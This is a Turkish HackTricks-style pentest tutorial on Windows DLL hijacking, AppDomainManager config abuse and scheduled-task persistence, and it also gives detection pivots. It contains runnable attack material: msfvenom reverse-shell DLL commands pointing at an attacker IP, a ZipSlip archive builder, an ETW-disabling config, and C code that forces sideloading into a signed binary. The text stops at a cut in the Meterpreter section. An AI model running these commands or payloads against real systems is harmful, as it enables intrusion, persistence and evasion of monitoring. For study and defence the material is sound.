# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Başlıca kod yürütme ve kalıcılık sağlama, daha nadiren de ayrıcalık yükseltme amacıyla kullanılır. Burada ayrıcalık yükseltmeye odaklanılsa da ele geçirme yöntemi, amaçlar arasında aynı kalır.

### Yaygın Teknikler

DLL Hijacking için çeşitli yöntemler kullanılır ve her birinin etkililiği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirmek; orijinal DLL'nin işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Uygulamanın arama düzeninden yararlanarak kötü amaçlı DLL'yi, arama yolunda meşru DLL'den önce gelecek şekilde yerleştirmek.
3. **Phantom DLL Hijacking**: Uygulamanın, var olmayan ve gerekli olduğunu düşündüğü bir DLL'yi yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` gibi arama parametrelerini veya `.exe.manifest` / `.exe.local` dosyalarını değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizinindeki kötü amaçlı bir eşdeğeriyle değiştirmek. Bu yöntem genellikle DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi, kopyalanan uygulamayla birlikte kullanıcının denetimindeki bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL yükleyicisini** de uygulayabilir. Ayrıcalıklı bir süreç, `Libraries` veya `Plugins` gibi bir alt dizini listeleyip seçilen bir DLL'yi yardımcı programa aktarabilir; bu işlem normal Windows DLL arama sırasından bağımsızdır. Başka bir hesap tam olarak bu dizinde dosya oluşturabiliyorsa, bunu inceleme için bir ipucu olarak değerlendirin: sürecin kimliğini, dizinin etkin ACL'sini, dosya seçme kuralını ve erişilebilir bir yükleme işlemi olup olmadığını doğrulayın. Yürütülebilir dosyanın yanındaki yazılabilir bir dizin, sürecin buradan DLL yüklediğini tek başına kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine saldırgan kodu yükletmenin tek yolu değildir. Hedef yürütülebilir dosya **managed** bir uygulamaysa, CLR ayrıca yürütülebilir dosyanın adını taşıyan bir **uygulama yapılandırma dosyasına** da bakar (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma, EXE'nin yanına yerleştirilmiş saldırgan denetimindeki bir assembly'yi işaret ediyorsa CLR, **uygulamanın normal kod akışından önce** bu assembly'yi yükler ve güvenilir sürecin içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre, özel yöneticinin kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Asgari yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Pratik notlar:
- Bu **yalnızca .NET Framework için geçerli** bir tradecraft yöntemidir. Win32 DLL arama sırasına değil, CLR config ayrıştırmasına dayanır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı ön inceleme için: `sigcheck -m target.exe`, `corflags target.exe` veya PE metadata içindeki **CLR Runtime Header** kontrol edilebilir.
- Config dosyasının adı, çalıştırılabilir dosyanın adıyla birebir eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **imzalı Microsoft/vendor ikilileriyle** kullanışlıdır; çünkü güvenilir EXE'ye dokunulmazken kötü amaçlı managed assembly aynı süreç içinde çalışır.
- Yazılabilir bir installer/update dizinine zaten erişiminiz varsa, AppDomainManager hijacking **ilk aşama** olarak kullanılabilir; sonraki aşamalar için klasik DLL sideloading veya reflective loading uygulanabilir.

### Downloader + scheduled-task bootstrap olarak AppDomainManager

Pratik bir saldırı modeli, güvenilir managed EXE'yi hem kötü amaçlı bir `*.config` hem de yalnızca **küçük bir bootstrapper** olarak çalışan kötü amaçlı bir AppDomainManager DLL ile eşleştirir:<sup>[[25]](#references)</sup>

1. Kullanıcı, imzalı bir .NET installer veya updater'ı `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan başlatır.
2. Yanındaki config, meşru uygulama mantığı başlamadan önce CLR'nin saldırganın assembly'sini yüklemesine neden olur.
3. Kötü amaçlı manager bir **path gate** uygular (örneğin, yalnızca host EXE `Downloads` dizininden çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` dizininden çalışmasına izin verir).
4. Kontrol başarılı olursa payload'ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve scheduled task ile persistence kurar.

Bu varyant neden önemlidir:
- İmzalı host EXE değişmeden kalır; bu nedenle yalnızca ana ikilinin hash'ini kontrol eden triage, ihlali fark etmeyebilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya sandbox konumuna taşımak zinciri kasıtlı olarak bozabilir.
- İlk aşamadaki AppDomainManager DLL'si küçük ve düşük profilli kalabilir; gerçek implant daha sonra indirilir.

Bu modelde sık görülen minimal persistence örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- `/rl highest`, bu kullanıcı/oturum için **kullanılabilir en yüksek** anlamına gelir; tek başına SYSTEM yetkisine yükselme garantisi vermez.
- Bu teknik, klasik eksik-DLL arama sırası hijacking'inden ziyade **.NET config abuse üzerinden execution/persistence** olarak sınıflandırılır; yine de operatörler çoğu zaman ikisini birlikte kullanır.

Tespit göstergeleri:
- **ZIP'ten çıkarılmış dizinlerden**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan, yanında `<exe>.config` bulunan imzalı .NET executable'ları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı/üretici güncelleyicilerini taklit eden yeni zamanlanmış görevler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan, kısa süre çalışan managed bootstrap süreçleri.
- Executable yolu beklenen bir kullanıcı profili diziniyle eşleşmediği sürece erken çıkan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir zamanlanmış görevi hijack etme

Persistence için yalnızca **yeni görev oluşturulmasını** aramayın. Bazı saldırı grupları, meşru bir yükleyicinin **normal bir güncelleme görevi** oluşturmasını bekler ve ardından görev eylemini **yeniden yazar**; böylece mevcut ad, yazar ve tetikleyici savunmacılara tanıdık görünmeye devam eder.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu görevi belirleyin.
2. Görev XML'ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca eylemi değiştirerek görevin, kullanıcı tarafından yazılabilir bir staging dizinindeki **güvenilir host EXE**'nizi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain üzerinden yükler.
4. Yeni ve göze çarpan bir persistence artefaktı oluşturmak yerine aynı görev adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir satıcı güncelleyicisi).
- **Task Scheduler hizmeti** görevi başlatır; bu nedenle üst/ata süreç doğrulaması genellikle `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı önceden mevcut olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın denetimindeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı avlama pivotları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir baseline ile karşılaştırın.
- **Satıcıya aitmiş gibi görünen bir güncelleme görevi** **kullanıcının yazabildiği dizinlerden** çalıştığında veya yanında `*.config` dosyası bulunan bir .NET EXE başlattığında uyarı oluşturun.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants yöntemlerini DLL sideloading üzerine katmanlandıran adım adım bir zincir için aşağıdaki iş akışına göz atın.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri bulma

Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals içindeki [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırıp **aşağıdaki 2 filtreyi ayarlamaktır**:

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals içindeki procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals içindeki procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity** görünümünü açmaktır:

![Common Techniques - Eksik DLL'leri bulma: yalnızca File System Activity görünümünü açın](<../../../images/image (153).png>)

**Genel olarak eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda **bırakın**.\
**Belirli bir yürütülebilir dosyada eksik DLL** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olay yakalamayı durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'leri istismar etme

Ayrıcalıkları yükseltmek için, **ayrıcalıklı bir sürecin yazabileceğiniz bir konumdan yüklemeye çalıştığı bir DLL'yi** bulun. Bu, meşru DLL'yi içeren dizinden önce aranan bir dizini denetlediğinizde veya istenen DLL mevcut olmadığında ve aranan dizinlerden birine yazabildiğinizde gerçekleşebilir.

### DLL Arama Sırası

**DLL'lerin nasıl yüklendiğini ayrıntılı olarak** [**Microsoft belgelerinde**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **bulabilirsiniz.**

**Windows uygulamaları**, DLL'leri önceden tanımlanmış bir dizi arama yolunda belirli bir sırayı izleyerek arar. DLL hijacking sorunu, zararlı bir DLL'nin bu dizinlerden birine stratejik olarak yerleştirilmesi ve böylece orijinal DLL'den önce yüklenmesinden kaynaklanır. Bunu önlemek için uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullandığından emin olun.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak dizin aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun **App Paths** kayıt defteri anahtarında belirtilen uygulama başına yolu içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinden başlar.

Son olarak, bir DLL ad yerine mutlak yolu kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisini yalnızca belirtilen yolda arar; adla istenen bağımlılıklar yine geçerli arama sırasını izler.

Arama sırasını değiştirmenin başka yolları da var, ancak burada bunları açıklamayacağım.

### İsteğe bağlı dosya yazma ilkelini eksik DLL hijack'ine zincirleme

**İlgili teknik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Sürecin aradığı ancak bulamadığı DLL adlarını toplamak için **ProcMon** filtrelerini (`Process Name` = hedef EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. Binary bir **zamanlama/hizmet** üzerinden çalışıyorsa, bu adlardan birine sahip bir DLL'yi **uygulama dizinine** (arama sırasındaki #1. konum) bırakmak, DLL'nin bir sonraki çalıştırmada yüklenmesini sağlar. Bir .NET scanner örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` dosyasını arıyordu.
3. Herhangi bir export içeren bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. İlkeliniz **ZipSlip tarzı isteğe bağlı yazma** ise DLL'nin uygulama klasörüne düşmesi için çıkarma dizininin dışına taşan bir ZIP girdisi hazırlayın:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma bırakın; zamanlanmış görev işlemi yeniden başlattığında, kötü amaçlı DLL yüklenir ve kodunuzu hizmet hesabı olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla sideloading'i zorlama

Yeni oluşturulan bir işlemin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, işlemi ntdll’nin yerel API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırganın denetimindeki bir dizini belirtmek, içe aktarılan bir DLL’yi adına göre çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef işlemin kötü amaçlı bir DLL’yi bu dizinden yüklemesini sağlayabilir.

Temel fikir
- RtlCreateProcessParametersEx ile işlem parametrelerini oluşturun ve denetiminizdeki klasörü (ör. dropper/unpacker'ınızın bulunduğu dizini) işaret eden özel bir DllPath belirtin.
- RtlCreateUserProcess ile işlemi oluşturun. Hedef ikili dosya bir DLL’yi adına göre çözdüğünde, yükleyici çözümleme sırasında belirtilen DllPath'e başvurur; böylece kötü amaçlı DLL hedef EXE ile aynı dizinde olmasa bile güvenilir sideloading mümkün olur.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca geçerli süreci etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL’yi adına göre içe aktarmalı veya LoadLibrary çağrısı yapmalıdır (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata işleme):

<details>
<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla DLL sideloading'i zorlama</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'e proxy yapan kötü amaçlı bir xmllite.dll dosyasını DllPath dizinine yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen imzalı bir binary başlatın. Loader, import'u belirtilen DllPath üzerinden çözümler ve DLL'inizi sideload eder.

Bu tekniğin gerçek saldırılarda çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: başlangıçtaki bir launcher, yardımcı bir DLL bırakır; bu DLL de saldırganın DLL'inin bir staging dizininden yüklenmesini sağlamak için özel bir DllPath ile Microsoft imzalı, hijack edilebilir bir binary başlatır.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking, `.exe.config` ile

**.NET Framework** hedeflerinde, uygulamanın yanındaki **`.exe.config`** dosyası kötüye kullanılarak bellek yamalanmadan **`Main()` öncesinde** sideloading yapılabilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyası ve saldırganın kontrolündeki bir veya daha fazla assembly ile aynı dizine yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Ana EXE başlar ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, runtime'ın saldırganın kontrolündeki bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir ana bilgisayar süreci içinde **`Main()` öncesi kod yürütme** elde eder.
4. Aynı config, CLR'ı önce yerel assembly'leri çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching yapmadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Kampanya tarzı örüntü (iç içe geçme biçimi direktife / CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden faydalı:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak bu klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, yürütmeyi CLR başlatılırken saldırganın koduna aktarır; böylece meşru uygulama mantığı çalışmadan önce devreye girer.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulama hatası almadan imzasız veya değiştirilmiş assembly'leri yüklemesini sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmelerinin daha yeni assembly'lere gitmesini önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle dikkat çekicidir; çünkü implantın bellekte `EtwEventWrite` işlevine yama uygulaması yerine, yapılandırma üzerinden **CLR kendi ETW görünürlüğünü devre dışı bırakır**.

Yakın tarihli kampanyalarda görülen operasyonel örüntü:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı görünen bir **AppData güncelleme** klasörüne kopyalar, ana dosyanın adını `update.exe` gibi bir adla değiştirir ve bir **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export'unu yüklemeden önce yürütme bağlamını doğrular (örneğin, Task Scheduler kaynaklı beklenen üst sürecin `svchost.exe` olması).

Araştırma fikirleri:
- Kullanıcının yazabildiği konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan, imzalı veya başka şekilde meşru **.NET yürütülebilir dosyaları**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden adlandırılmış güncelleme ikililerini başlatan scheduled task'ler.
- Bir scheduled task'in güvenilir bir .NET ana makinesini başlattığı ve bu ana makinenin hemen kendi dizininden üreticiye ait olmayan assembly'leri yüklediği üst/alt süreç zincirleri.

#### Windows belgelerinde DLL arama sırasına ilişkin istisnalar

Windows belgelerinde standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bellekte zaten yüklü bir DLL ile aynı ada sahip bir **DLL** ile karşılaşıldığında sistem olağan aramayı atlar. Bunun yerine, bellekteki DLL'yi varsayılan olarak kullanmadan önce yönlendirme ve manifest kontrolü yapar. **Bu senaryoda sistem DLL için arama yapmaz**.
- DLL, geçerli Windows sürümü için bir **bilinen DLL** olarak tanındığında sistem, bu bilinen DLL'nin kendi sürümünü ve ona bağlı DLL'leri kullanır; **arama sürecini atlar**. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarı, bu bilinen DLL'lerin listesini tutar.
- Bir **DLL'nin bağımlılıkları varsa**, bu bağımlı DLL'ler, ilk DLL tam bir yol kullanılarak bulunmuş olsa bile, yalnızca **modül adlarıyla** belirtilmiş gibi aranır.

### Ayrıcalıkları Yükseltme

**Gereksinimler**:

- **Farklı ayrıcalıklarla** (yatay veya yanal hareket) çalışan ya da çalışacak ve **DLL'si eksik** olan bir süreç belirleyin.
- **DLL'nin** aranacağı tüm **dizinlere** **yazma erişiminiz** olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Bu ön koşullar varsayılan olarak nadiren görülür: ayrıcalıklı yürütülebilir dosyaların genellikle eksik DLL bağımlılıkları olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Yine de yanlış yapılandırılmış ortamlar bu iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesine bakın. Temel amacı UAC bypass olsa da, belirli Windows sürümleri için DLL-hijacking PoC'leri içerir; bunlar genellikle bulduğunuz yazılabilir dizine uyarlanabilir.

Bir klasördeki **izinlerinizi kontrol etmek** için şunu kullanabilirsiniz:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın import'larını ve bir dll'in export'larını da şu şekilde kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For **System Path klasörüne** yazma izinleriyle **DLL Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** hakkında tam bir rehber için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), system PATH içindeki herhangi bir klasörde yazma izinleriniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilgi çekici otomatik araçlar **PowerSploit fonksiyonlarıdır**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

İstismar edilebilir bir senaryo bulmanız durumunda, bunu başarıyla istismar etmek için en önemli şeylerden biri **çalıştırılabilir dosyanın içe aktaracağı tüm fonksiyonları dışa aktaran bir dll oluşturmaktır**. Her durumda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya[ **High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system)**.** yükselmek için kullanışlı olduğunu unutmayın. **Geçerli bir dll'nin nasıl oluşturulacağına** dair bir örneği, çalıştırma amacıyla DLL hijacking'e odaklanan bu DLL hijacking incelemesinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde** **şablon** olarak kullanılabilecek veya **gerekli olmayan fonksiyonları dışa aktaran bir dll** oluşturmak için kullanılabilecek bazı **temel dll kodları** bulabilirsiniz.

## **DLL Oluşturma ve Derleme**

### **DLL Proxifying**

Temel olarak bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** **beklendiği gibi çalışan** ve onun **arayüzünü sunan** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir çalıştırılabilir dosya belirtip proxify etmek istediğiniz kütüphaneyi seçebilir ve **proxified bir dll oluşturabilir** ya da DLL'yi belirtip **proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir meterpreter (x86) edinin:**

```bash
